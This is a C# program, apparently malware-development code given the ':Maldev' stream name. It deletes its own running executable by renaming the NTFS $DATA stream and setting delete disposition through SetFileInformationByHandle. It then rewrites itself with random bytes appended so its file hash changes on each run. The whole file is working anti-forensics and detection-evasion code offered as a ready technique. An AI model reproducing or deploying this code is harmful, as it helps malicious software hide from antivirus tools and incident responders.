using System;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using Microsoft.Win32.SafeHandles;

namespace SelfDelete
{
    class Program
    {
        const string NEW_STREAM = ":Maldev";

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern uint GetModuleFileNameW(IntPtr hModule, [Out] StringBuilder lpFilename, int nSize);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern SafeFileHandle CreateFileW(
            string lpFileName,
            uint dwDesiredAccess,
            FileShare dwShareMode,
            IntPtr lpSecurityAttributes,
            FileMode dwCreationDisposition,
            uint dwFlagsAndAttributes,
            IntPtr hTemplateFile);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool SetFileInformationByHandle(
            SafeFileHandle hFile,
            FileInfoByHandleClass FileInformationClass,
            byte[] lpFileInformation,
            uint dwBufferSize);

        enum FileInfoByHandleClass
        {
            FileRenameInfo = 3,
            FileDispositionInfo = 4
        }

        [StructLayout(LayoutKind.Sequential)]
        struct FILE_RENAME_INFO
        {
            public uint Flags;
            public IntPtr RootDirectory;
            public uint FileNameLength;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 1)]
            public byte[] FileName;
        }

        static bool DeleteSelf()
        {
            // Increased buffer size for long paths
            StringBuilder path = new StringBuilder(32767);
            if (GetModuleFileNameW(IntPtr.Zero, path, path.Capacity) == 0)
            {
                Console.WriteLine($"[!] GetModuleFileNameW Failed: {Marshal.GetLastWin32Error()}");
                return false;
            }
            string currentPath = path.ToString();

            // Create proper rename info structure
            byte[] newStreamBytes = Encoding.Unicode.GetBytes(NEW_STREAM);
            int structSize = Marshal.SizeOf(typeof(FILE_RENAME_INFO)) + newStreamBytes.Length - 1;
            byte[] renameInfo = new byte[structSize];

            using (var ptr = new PinnedObject(renameInfo))
            {
                var info = new FILE_RENAME_INFO
                {
                    Flags = 0x1, // MOVEFILE_REPLACE_EXISTING
                    RootDirectory = IntPtr.Zero,
                    FileNameLength = (uint)newStreamBytes.Length
                };

                Marshal.StructureToPtr(info, ptr.Pointer, false);
                Marshal.Copy(newStreamBytes, 0, ptr.Pointer + Marshal.OffsetOf<FILE_RENAME_INFO>(nameof(FILE_RENAME_INFO.FileName)).ToInt32(), newStreamBytes.Length);
            }

            // Rename file stream
            using (var hFile = CreateFileW(
                currentPath,
                0x00010000 | 0x00100000, // DELETE | SYNCHRONIZE
                FileShare.Read,
                IntPtr.Zero,
                FileMode.Open,
                0,
                IntPtr.Zero))
            {
                if (hFile.IsInvalid)
                {
                    Console.WriteLine($"[!] CreateFileW [R] Failed: {Marshal.GetLastWin32Error()}");
                    return false;
                }

                Console.Write($"[i] Renaming :$DATA to {NEW_STREAM}... ");
                if (!SetFileInformationByHandle(hFile, FileInfoByHandleClass.FileRenameInfo, renameInfo, (uint)renameInfo.Length))
                {
                    Console.WriteLine($"[!] Rename Failed: {Marshal.GetLastWin32Error()}");
                    return false;
                }
                Console.WriteLine("[+] DONE");
            }

            // Mark file for deletion
            using (var hFile = CreateFileW(
                currentPath,
                0x00010000 | 0x00100000, // DELETE | SYNCHRONIZE
                FileShare.Read,
                IntPtr.Zero,
                FileMode.Open,
                0,
                IntPtr.Zero))
            {
                if (hFile.IsInvalid)
                {
                    int err = Marshal.GetLastWin32Error();
                    if (err == 2) return true; // File not found
                    Console.WriteLine($"[!] CreateFileW [D] Failed: {err}");
                    return false;
                }

                Console.Write("[i] Deleting... ");
                byte[] disposeInfo = { 1 }; // DeleteFile = true
                if (!SetFileInformationByHandle(hFile, FileInfoByHandleClass.FileDispositionInfo, disposeInfo, 1))
                {
                    Console.WriteLine($"[!] Delete Failed: {Marshal.GetLastWin32Error()}");
                    return false;
                }
                Console.WriteLine("[+] DONE");
            }

            return true;
        }
        //
        public static byte[] GetOriginalWithRandomAppended(int randomBytesSize = 1024)
        {
            // 1. Get current executable path
            string currentExePath = Assembly.GetExecutingAssembly().Location;

            // 2. Read original bytes
            byte[] originalBytes = File.ReadAllBytes(currentExePath);

            // 3. Generate random bytes
            byte[] randomBytes = new byte[randomBytesSize];
            new Random().NextBytes(randomBytes);

            // 4. Combine arrays
            byte[] combined = new byte[originalBytes.Length + randomBytes.Length];
            Buffer.BlockCopy(originalBytes, 0, combined, 0, originalBytes.Length);
            Buffer.BlockCopy(randomBytes, 0, combined, originalBytes.Length, randomBytes.Length);

            return combined;
        }


        static void Main(string[] args)
        {

            // 1. get the original random file bytes 
            byte[] modifiedBytes = GetOriginalWithRandomAppended();
            // 2. self delete 
            if (!DeleteSelf())
                Environment.Exit(-1);
            // 3. save it 
            string originalFileName = Path.GetFileNameWithoutExtension(Assembly.GetExecutingAssembly().Location);
            string savePath = Path.Combine(Directory.GetCurrentDirectory(), originalFileName + ".exe");
            File.WriteAllBytes(savePath, modifiedBytes);


        }
    }

    // Helper class for pinning byte arrays
    class PinnedObject : IDisposable
    {
        public IntPtr Pointer { get; }
        private readonly GCHandle _handle;

        public PinnedObject(byte[] data)
        {
            _handle = GCHandle.Alloc(data, GCHandleType.Pinned);
            Pointer = _handle.AddrOfPinnedObject();
        }

        public void Dispose()
        {
            _handle.Free();
        }
    }
}